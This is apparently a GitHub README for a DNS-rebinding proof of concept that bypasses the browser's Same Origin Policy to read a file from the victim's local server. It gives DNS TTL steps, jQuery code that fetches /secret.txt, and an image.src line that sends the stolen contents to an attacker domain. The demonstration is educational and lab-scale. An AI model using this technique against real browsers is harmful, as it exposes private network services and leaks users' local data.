# Bypass Same Origin Policy - BY-SOP

Bypass Same Origin Policy with DNS-rebinding to retrieve local server file.

**EDIT 15/01/2018:** [@taviso](https://twitter.com/taviso) open a [pull a request](https://github.com/transmission/transmission/pull/468) to fix a security issue (Remote Code Execution on Transmission) using this vulnerability. I think it's cool to have an real example on how hacker can use this attack :)

**Goal** : retrieve a file on a private server http://127.0.0.1/secret.txt 
This normaly should by impossible due to [Same Origin Policy](https://en.wikipedia.org/wiki/Same-origin_policy) but we will use [DNS-rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attack to bypass the SOP and retrieve the file.

> This attack can be used to breach a private network by causing the victim's web browser to access machines at private IP addresses and returning the results to the attacker.

**Important** : use the same port, `127.0.0.1` is different from `127.0.0.1:8080`, same with https (check this [example](https://developer.mozilla.org/fr/docs/Web/JavaScript/Same_origin_policy_for_JavaScript))

### Victim:

- visit the malicious page for at least ~2-3 minutes (playing flash game, fill a form etc)

### Attacker:
    
* attacker setup a domain with the lowest TTL (60 second, 120 for CloudFlare )
* one the victim visit the malicious page, he changes the dns IP of the domain with the local ip targeted

    - before `foo.domain.com. 59  IN  A   5.135.66.45`
    - after  `foo.domain.com. 59  IN  A   127.0.0.1`

    Since the `TTL` is very short, the attacker will make another request to retrieve the private file **AFTER** the `TTL` time is up (> 59), the request has to do an additional DNS request

    ```javascript
    setTimeout(function SOP_bypass() {
        $.get('/secret.txt', function(data) {
            // action with data
        });
    }, 180000); //3min to be sure
    ```

    However, by changing the DNS record in the meantime, the domain will resolve to the victim page with the local IP.
        There is no more Same Origin Policy and we can retrieve the content of the file.

* the content is send to another domain to save the data
    ```javascript
    setTimeout(function SOP_bypass() {
        $.get('/secret.txt', function(data) {
            // action with data
            var image = new Image();
            image.src='http://domain.com/save.php?'+data;
        });
    }, 180000); //3min to be sure
    ```

    The file `save.php` don't need to allow Cross-origin resource sharing (CORS) from 127.0.0.1:80 to accept the request. In fact, img are incompatible with SOP. 
    But if you really want an execption, in PHP it can be done by adding this line `header("Access-Control-Allow-Origin: *.domain.com");`


* finally we have:
    ```bash
        cat save.txt
        {"WIN{AweSome_ByPass_SOP}":""}
    ```

## Setup

* Use the file `malicious.html`, the file `bypass_sop.html` is the same but more for academic comprehension.

* Add a subdomain with TTL 59 (120 in Cloudflare)
* Add another subdomain and allow CORS from your domain if you use GET or just use `image.src` to bypass the restriction CORS
* Victim
    - launch a local server `http-server -p 80 Dir`
    - launch the browser
    - go on sub.domain.com/malicious.html
* Change the DNS ip
* Wait
* Get the result into the other subdomain you setup

![BY-SOP](http://mpgn.fr/assets/images/ByP-SOP.jpg)

## Contributor

[mpgn](https://github.com/mpgn) 

## Licences

[licence MIT](https://github.com/mpgn/ByP-SOP/blob/master/LICENSE)

## References

* http://www.ptsecurity.com/download/DNS-rebinding.pdf
* https://www.abortz.net/papers/dns-rebinding.pdf
* https://en.wikipedia.org/wiki/DNS_rebinding
* http://www.circleid.com/posts/070809_defending_networks_dns_rebinding_attacks/
* https://dollberg.xyz/ctf/2016/03/13/0CTF-Monkey-Writeup/
* http://secgroup.github.io/2016/03/14/0ctf-writeup-monkey/
* https://w00tsec.blogspot.fr/2016/03/0ctf-2016-write-up-monkey-web-4.html

